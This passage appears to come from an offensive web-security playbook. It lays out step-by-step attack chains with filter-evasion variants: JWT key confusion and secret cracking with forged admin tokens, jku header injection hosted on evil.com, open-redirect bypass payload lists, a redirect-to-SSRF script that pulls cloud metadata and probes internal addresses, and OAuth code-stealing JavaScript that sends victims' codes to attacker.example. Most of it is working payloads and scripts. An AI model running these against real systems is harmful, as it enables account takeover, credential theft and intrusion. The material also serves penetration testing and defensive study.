# The server will obtain the public key from the attacker's URL for validation
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```

**WAF/EDR bypass variants:**

**1. Try multiple public-key formats**
_Some JWT libraries handle the public-key format differently; try multiple formats_
```
# PEM format (standard)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER format (binary)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# With/without newlines
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# Public keys in different encodings as the HMAC key
```

---

### JWT key brute force  `jwt-secret-bruteforce`
When the JWT uses an HMAC symmetric algorithm (HS256/HS384/HS512) with a weak key, the signing key can be recovered via a dictionary or brute force, then used to forge any JWT token.
Sub-category: **key cracking** · tags: `JWT` `key brute force` `HS256` `weak key` `hashcat`

**Prerequisites:** the target JWT uses an HMAC algorithm (HS256, etc.); a valid JWT sample has been obtained; hashcat or jwt_tool

**Attack chain:**

**1. 1. Confirm the algorithm and structure**
_Confirm the JWT uses an HMAC symmetric algorithm, whose key can be brute-forced_
```
# Decode the JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# Confirm it is an HMAC symmetric algorithm before brute forcing
# HS256 / HS384 / HS512 = brute-forceable
# RS256 / ES256 = the key cannot be directly brute-forced
```

**2. 2. hashcat GPU-accelerated brute force**
_hashcat GPU-accelerated cracking of the JWT HMAC key_
```
# hashcat mode 16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt content is the full JWT string
# eyJhbGci....signature

# Use rules to accelerate
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask brute force (8-digit numeric key)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```

**3. 3. jwt_tool dictionary brute force**
_jwt_tool dictionary-mode cracking of the JWT key_
```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = enable dictionary-cracking mode
# -d = specify the dictionary file
# Also supports quick testing of common weak keys
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```

**4. 4. Use the cracked key to forge a JWT**
_Use the cracked key to sign a forged admin JWT_
```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# Verify
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```

**WAF/EDR bypass variants:**

**1. Common default JWT keys**
_Prioritize trying common default/weak JWT keys_
```
# List of common weak keys
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```

---

### JWT JKU/X5U header injection  `jwt-jku-x5u-injection`
Use the jku (JWK Set URL) or x5u (X.509 URL) parameter in the JWT Header to point the key source to an attacker-controlled server, making the server validate the JWT with the attacker's public key, thereby achieving token forgery.
Sub-category: **Header injection** · tags: `JWT` `JKU` `X5U` `Header injection` `JWKS` `key hijacking`

**Prerequisites:** the target JWT supports the jku/x5u Header parameter; the attacker has a public server; a Python environment

**Attack chain:**

**1. 1. Probe JKU/X5U support**
_Check whether the JWT uses the jku/x5u header and the target JWKS endpoint_
```
# Decode the JWT Header to see whether it contains jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq

# Common original Header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# Check the JWKS endpoint
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```

**2. 2. Generate the attacker's key pair**
_Generate the attacker's RSA key pair and construct a JWKS file_
```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# Generate an RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Export the PEM format
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# Generate the JWKS-format public key
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```

**3. 3. Host the JWKS and sign the JWT**
_Host the JWKS file and sign the JWT with the attacker's private key, with jku pointing to the attacker's server_
```
# Host jwks.json on the attacker's server
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# Sign with the attacker's private key
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```

**4. 4. Verify the attack**
_Use the jku-injected forged JWT to access the admin endpoint_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# Server flow:
# 1. Parse the jku URL in the JWT Header
# 2. Obtain the JWKS public key from evil.com
# 3. Validate the signature with the attacker's public key — passes!
# 4. Trust the admin identity in the Payload
```

**WAF/EDR bypass variants:**

**1. JKU URL bypass restrictions**
_Use open redirects, subdomain takeover, and URL obfuscation to bypass the jku domain allowlist_
```
# Open redirect to bypass the domain allowlist
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# Subdomain takeover
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL obfuscation
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```

---

### · Open redirect

### Basic open redirect  `redirect-basic`
URL-redirect vulnerability exploitation
Sub-category: **basic** · tags: `redirect` `url` `phishing`

**Prerequisites:** a parameter controls the redirect address

**Attack chain:**

**1. Direct redirect**
_Direct redirect to the attacker's site_
```
http://target.com/redirect?url=http://attacker.com
```

**2. Bypass validation**
_@-symbol bypass_
```
http://target.com/redirect?url=http://attacker.com@target.com
```

**3. Slash bypass**
_// to bypass the protocol_
```
http://target.com/redirect?url=//attacker.com
```

**WAF/EDR bypass variants:**

**1. URL encoding and double-encoding bypass**
_Bypass the allowlist or blacklist detection of the redirect target address via URL encoding, double URL encoding, Unicode homoglyphs, CRLF injection, etc._
```
# URL encoding:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# Double encoding:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode encoding:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF injection:
/redirect?url=%0d%0aLocation:%20http://attacker.com
```

**2. Backslash and data: URI bypass**
_Use the differential behavior of backslashes in different parsers, the data: URI protocol, and multi-slash protocol-relative URLs to bypass the domain allowlist validation_
```
# Backslash tricks:
/redirect?url=http://attacker.com@target.com
/redirect?url=//attacker.com
/redirect?url=/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# Protocol-relative URL variants:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com
```

---

### Redirect bypass  `redirect-bypass`
Open-redirect bypass techniques
Sub-category: **Bypass** · tags: `redirect` `bypass`

**Prerequisites:** a redirect parameter exists

**Attack chain:**

**1. URL encoding**
_Use URL encoding_
```
redirect=http%3a%2f%2fattacker.com
```

**2. @ symbol**
_Exploit the URL authority part_
```
redirect=http://target.com@attacker.com
```

**3. Backslash**  _[windows]_
_Use a backslash_
```
redirect=https:/\attacker.com
```

**WAF/EDR bypass variants:**

**1. Backslash path normalization**
_Use the path-normalization difference of backslashes across different browsers/servers to bypass the redirect domain allowlist_
```
# Backslash replacing forward slash
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=https:\\evil.com

# Path traversal to bypass the domain allowlist
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# Protocol-relative URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\evil.com
```

**2. URL fragment and parameter injection**
_Use URL fragment identifiers, parameter pollution, and full URL encoding to bypass the server's redirect-target check_
```
# Fragment-identifier confusion
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# Parameter pollution
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# Encoding obfuscation
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

**3. Null byte and special-character truncation**
_Use null-byte truncation of URL validation, CRLF injection of extra headers, and special whitespace characters to obfuscate URL parsing_
```
# Null-byte truncation
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# Newline injection
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/space obfuscation
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)
```

---

### Redirect to SSRF  `redirect-ssrf`
Use an open-redirect vulnerability as a springboard to direct SSRF probing to the internal network, bypassing the SSRF URL allowlist/blacklist restriction
Sub-category: **SSRF** · tags: `redirect` `ssrf`

**Prerequisites:** the target has an open-redirect vulnerability; the target has an SSRF feature point (URL parameter/Webhook, etc.); the SSRF filter only checks the initial URL and does not track redirects

**Attack chain:**

**1. Identify open-redirect points**  _[linux]_
_Find the target site's open-redirect endpoint and parameter_
```
# Common redirect parameters:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# Batch-test common parameters:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "${param}: HTTP ${status} → ${location}"
done
```

**2. Bypass the SSRF filter via a redirect**  _[linux]_
_Use the target's own redirect endpoint to bypass the SSRF domain-allowlist restriction_
```
# Scenario: the SSRF endpoint checks the URL domain allowlist but does not check the redirect target

# Normal SSRF request (blocked):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → returns: "Blocked: internal IP"

# Bypass via redirect:
# 1. First confirm the redirect works:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. Use the redirect URL as the SSRF input:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → the SSRF filter sees target.com (in the allowlist) and permits it
# → the server follows the redirect to 169.254.169.254
# → returns AWS metadata
```

**3. Short-link and DNS-rebinding assistance**
_Use short links, self-hosted redirects, and DNS rebinding to assist the SSRF bypass_
```
# If the target site has no open redirect, use an external service:

# 1. Short-link service redirect:
# Create a short link pointing to an internal IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. Self-hosted redirect server:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS rebinding:
# Use tools like rbndr.us; the DNS record switches between the attacker IP and the internal IP
# 1st resolution: attacker.com → 1.2.3.4 (passes the IP check)
# 2nd resolution: attacker.com → 169.254.169.254 (actual request)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
```

**4. Full exploitation chain: redirect→SSRF→intranet probing**
_Use the redirect→SSRF chain to batch-probe internal network resources_
```
# Full attack chain:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# Probe the intranet via redirects:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # Construct: SSRF → redirect → intranet target
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")
```

**WAF/EDR bypass variants:**

**1. URL-parsing-difference exploitation**
_Use the difference in how different URL-parsing libraries (cURL/urllib/Java URL) parse the authority/host part to bypass the SSRF allowlist_
```
# Exploit URL-parsing-library differences
http://evil.com#@target.com
http://evil.com\@target.com
http://target.com@evil.com

# Special URL formats
http://evil。com (full-width period)
http://ⓔⓥⓘⓛ.com (Unicode circled characters)
http://evil%E3%80%82com

# IPv6-address obfuscation
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

**2. DNS-rebinding attack**
_Use DNS rebinding to switch the resolution result between URL validation and the actual request, bypassing the SSRF IP blacklist_
```
# DNS Rebinding attack steps
# 1. Configure the DNS server to alternately return different IPs
# evil.com -> 1st resolution: public IP (passes validation)
# evil.com -> 2nd resolution: 127.0.0.1 (actual request)

# Use rbndr.us for automatic DNS rebinding
http://7f000001.c0a80001.rbndr.us/internal

# Use 1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: at check time the domain resolves to an allowlisted IP, at request time it resolves to an intranet IP
```

**3. IP-address obfuscation representations**
_Use decimal, octal, hexadecimal, and IPv6-mapped representations of the intranet IP to bypass the blacklist check_
```
# Decimal IP
http://2130706433  (= 127.0.0.1)
http://3232235777  (= 192.168.1.1)

# Octal IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# Mixed base
http://0177.0x0.0.1
http://127.1  (omit zero segments)
http://127.0.1

# IPv6-mapped
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]
```

### OAuth authorization-code hijacking — JS payload executed inside the redirect_uri

In OAuth, if `redirect_uri` allows an arbitrary subpath (or has an open redirect / XSS landing point), the attacker can execute JS on the redirected page to exfiltrate the `code` to their own server, completing a stealthy hijack. The victim only sees the normal OAuth consent flow.

```javascript
// Execute on the attacker-controlled redirect_uri page (or in an XSS sink on the redirect_uri domain)
var urlParams = new URLSearchParams(window.location.search);
var capturedCode = urlParams.get('code');  // can also be 'access_token' / 'id_token' (fragment mode)

if (capturedCode) {
    var http = new XMLHttpRequest();
    // GET mode with it in the query; in practice prefer fetch + no-cors or navigator.sendBeacon to evade CSP report-only
    http.open("GET", "https://attacker.example/log_code.php?code=" + encodeURIComponent(capturedCode), true);
    http.send();
}

// implicit / hybrid flow (token in the fragment):
// var fragParams = new URLSearchParams(window.location.hash.slice(1));
// var token = fragParams.get('access_token') || fragParams.get('id_token');
```

**When to use**: the `redirect_uri` validation allows any `https://target.com/anywhere` subpath, and the subpath has an XSS / third-party-widget injection surface. When proving impact, only operate on your own two controlled accounts; do not induce real users to click.

### OAuth / redirect_uri URL-parsing differences — universal bypass library

The server commonly uses startsWith / parse_url / regex to compare the redirect_uri, but the client browser parses per [RFC 3986 + WHATWG URL](https://url.spec.whatwg.org/) for the actual redirect; the parsing difference between the two → redirect to the attacker's domain:

```text
# Authority-character ambiguity (@, ./, @host forms)
https://example.com?@www.attacker.com/
https://example.com/@www.attacker.com/
https://www.attacker.com@example.com/
https://www.attacker.com.example.com/
https://example.com?.www.attacker.com/
https://example.com#.www.attacker.com/
https://example.com/.www.attacker.com/

# Double URL nesting
https://example.com/https://www.attacker.com/
https://example.com%2f@example.com/        # %2f decoding ambiguity
https://example.com%2f@attacker.com/

# Backslash (`\`) — some libraries treat it as a path separator, browsers treat it as a host separator
https://example.com\@www.attacker.com/
https://example.com\\@www.attacker.com/
https://www.attacker.com\@example.com/

# Charset-encoding bypass (when the backend does mb_convert_encoding / iconv, %ff / %df may disappear or merge with the next byte)
https://example.com%ff@www.attacker.com/
https://example.com%df@www.attacker.com/

# Charset-decoding backend sample (PHP):
# $url = mb_convert_encoding($_GET['url'], "GBK", "UTF-8");
# %df under GBK merges with the next byte, and the host segment gets swallowed
```

**Key points for a real hit**:
- The server uses `parse_url` / `urlparse` to extract the host then does the allowlist comparison, but the client redirects per WHATWG → parsing difference
- The server does a charset conversion (GBK / Big5 / Shift-JIS) before comparing → the host changes after decoding
- Backslashes are treated as a path separator by some Go / Node.js / Python libraries, but as a host separator by browsers

**Report value**: the key to escalating from medium (open redirect) to high (account takeover) is combining the §OAuth authorization-code hijacking payload above to prove you can obtain someone else's `code`. Still self-demonstrate only; do not capture a real user's code.

---
